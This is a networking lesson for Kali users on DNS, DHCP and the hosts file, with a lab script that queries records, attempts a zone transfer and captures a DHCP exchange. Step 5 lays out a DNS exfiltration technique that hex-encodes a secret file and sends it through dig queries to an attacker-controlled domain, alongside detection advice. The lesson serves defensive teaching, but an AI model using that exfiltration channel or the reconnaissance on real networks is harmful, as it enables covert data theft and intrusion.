DNS, DHCP and the Application Layer

Summary

Where names become addresses and addresses become configuration. Both protocols are trust-on-first-use
and both are heavily targeted, because they run before anything is authenticated.

Key ideas

  • DNS is UDP/53 (TCP for zone transfers and large answers), hierarchical, and completely
    unverified by default
  • Record types that matter offensively: A, AAAA, MX, NS, TXT, CNAME, SOA, SRV
  • DNS zone transfer (AXFR) on a misconfigured server dumps the entire subdomain map
  • DHCP DORA: Discover, Offer, Request, Acknowledge. Offers a gateway and DNS before
    authentication exists — the rogue-DHCP and starvation attacks
  • The hosts file is a local override that bypasses DNS entirely
  • TLS, SMTP and HTTP are the app-layer protocols you will meet most

Terminology

Term Meaning
Resolver The component that answers your DNS queries
Root / TLD / authoritative The three levels of DNS hierarchy
Zone transfer (AXFR) Full zone copy between DNS servers
Recursion Server queries other servers for you
DORA DHCP's four-step exchange
Rogue DHCP An unauthorised server answering clients
Cache poisoning Inserting false records into a resolver's cache
/etc/hosts Static local name resolution
SRV record Advertises a service host and port
TXT record Free text; abused for SPF, and for data exfiltration

Kali commands

# --- query DNS the way a client does ---
cat /etc/resolv.conf
command -v dig nslookup host host
dig example.com A +short
dig example.com MX +short
dig @8.8.8.8 example.com +short
dig -x 1.1.1.1 +short                    # reverse
dig example.com ANY +short

# --- the records that map an organisation ---
dig +short NS example.com
dig +short MX example.com
dig +short TXT example.com
dig +short SRV _ldap._tcp.example.com

# --- try a zone transfer against YOUR OWN lab domain only ---
dig AXFR lab.local @192.168.56.1 2>&1 | head -20
# if the server is not authoritative for the zone, it refuses. That refusal is correct.

# --- /etc/hosts, and why it matters ---
cat /etc/hosts
getent hosts github.com                  # honours hosts, unlike dig
getent ahostsv4 github.com | head -3

# --- DHCP: what is on offer on this link ---
command -v dhclient udhcpc
sudo dhclient -d -1 2>&1 | head -20
# lease files:
ls -la /var/lib/dhcp/ 2>/dev/null
grep -A6 "lease {" /var/lib/dhcp/dhclient.leases 2>/dev/null | head -12

# --- watch DHCP on your lab link (two terminals) ---
echo "  T1: sudo tcpdump -i vboxnet0 -n -e port 67 or port 68"
echo "  T2: sudo dhclient -r vboxnet0 && sudo dhclient vboxnet0"

# --- passive DNS discovery from the terminal ---
command -v subfinder amass
subfinder -silent -d example.com 2>/dev/null | head -10

Field lab

Objective: map a domain with DNS, and watch a real DHCP exchange on your lab link.

# --- PRE-FLIGHT: this lab needs root, so authenticate ONCE, HERE, first ---
# `sudo something &` backgrounds the password PROMPT along with the command.
# With no terminal attached to answer it, sudo fails - and `2>/dev/null`
# then throws away the only clue. The result is a capture file that was
# never written, followed by a screenful of "no such file".
#
# `sudo -v` validates the credential in the FOREGROUND, where you can see
# and answer the prompt. It caches for ~15 minutes, so every backgrounded
# `sudo` below is prompt-free and actually runs.
if ! sudo -v; then
  echo "  sudo is unavailable or the password was wrong - stop here." >&2
  echo "  Everything below needs root. Nothing will be captured." >&2
  exit 1
fi
mkdir -p ~/aegis/labs/ccna-07 && cd ~/aegis/labs/ccna-07

# --- 1. record types that describe an organisation ---
{
  echo "=== my resolver config ==="; cat /etc/resolv.conf | grep -v '^#'
  echo
  for t in NS MX TXT SOA A; do
    echo "=== $t records for github.com ==="
    dig +short $t github.com 2>/dev/null | head -5
  done
  echo "=== SRV records (service location) ==="
  dig +short SRV _sip._udp.github.com 2>/dev/null | head -3
} 2>&1 | tee 01-dns.txt

# --- 2. the hosts file beats DNS (and that is an attack surface) ---
{
  echo "=== getent vs dig: getent honours /etc/hosts ==="
  echo "  getent hosts github.com : $(getent hosts github.com | head -1)"
  echo "  dig +short github.com    : $(dig +short github.com 2>/dev/null | head -1)"
  echo
  echo "=== /etc/hosts on this machine ==="
  cat /etc/hosts
  echo
  echo "Anyone who can write /etc/hosts can redirect any name on this host."
  ls -la /etc/hosts
} 2>&1 | tee 02-hosts.txt

# --- 3. attempt a zone transfer against your own lab domain ---
{
  echo "=== AXFR attempt (authorised lab targets only) ==="
  echo "--- against a domain this host does not serve (correct refusal expected) ---"
  dig AXFR example.com @127.0.0.1 2>&1 | grep -E "status:|Transfer failed" | head -3
  echo
  echo "If you run your own DNS server for the lab, this returns EVERY host:"
  echo "  dig AXFR lab.local @192.168.56.1"
} 2>&1 | tee 03-axfr.txt

# --- 4. a real DHCP exchange on the lab link ---
if ip -br addr show vboxnet0 >/dev/null 2>&1; then
  sudo timeout 15 tcpdump -i vboxnet0 -n -e "udp port 67 or udp port 68" 2>/dev/null \
     > 04-dhcp.txt &
  TC=$!
  sleep 1
  sudo dhclient -r vboxnet0 >/dev/null 2>&1
  sleep 1
  sudo dhclient vboxnet0 >/dev/null 2>&1 &
  sleep 8
  kill $TC 2>/dev/null; wait $TC 2>/dev/null
  echo "=== the DHCP exchange ==="
  grep -E "BOOTREQUEST|BOOTREPLY" 04-dhcp.txt | head -8
  echo
  cat <<'EOF'
  DORA:
    Discover  client -> broadcast, "is there a DHCP server?"
    Offer     server  -> "here is an address, gateway, DNS, lease time"
    Request   client  -> "I accept that offer"  <- the vulnerable step
    Ack       server  -> "confirmed"

  The Request is broadcast and unauthenticated. A rogue server that answers
  first becomes the client's gateway and DNS: full man-in-the-middle position.
EOF
  echo
  echo "=== what my lease actually says ==="
  grep -A8 "lease {" /var/lib/dhcp/dhclient.leases 2>/dev/null | tail -12
else
  echo "No vboxnet0 - build the lab (docs/LAB-SETUP.md) to capture DHCP." | tee 04-dhcp.txt
fi

# --- 5. why DNS is a covert channel ---
cat > 05-dns-exfil.md <<'EOF'
# DNS as a covert channel

Because DNS is required before almost anything else works, DNS traffic is permitted nearly
everywhere and inspected rarely.

Shape:   data.<hex-payload>.attacker-domain.com
Each subquery carries a few bytes; a cooperating server reassembles the stream.

**Authorised-lab-only exercise:** build it against a domain you control.

1. Encode:    xxd -p secret.txt | fold -w 30
2. Exfil:     dig +short b64fragment.yourdomain.com
3. Detect:    look for high-entropy subdomains in resolver logs
   sudo journalctl -u systemd-resolved | grep -oE '[a-f0-9]{20,}' | head

Defence: log all DNS, alert on volume and subdomain entropy, restrict egress to your resolver.
EOF
cat 05-dns-exfil.md

Step 4 is the one worth performing. Watching a real DORA exchange shows you that the client
broadcasts a request accepting an offer — which is the exact reason rogue DHCP works.
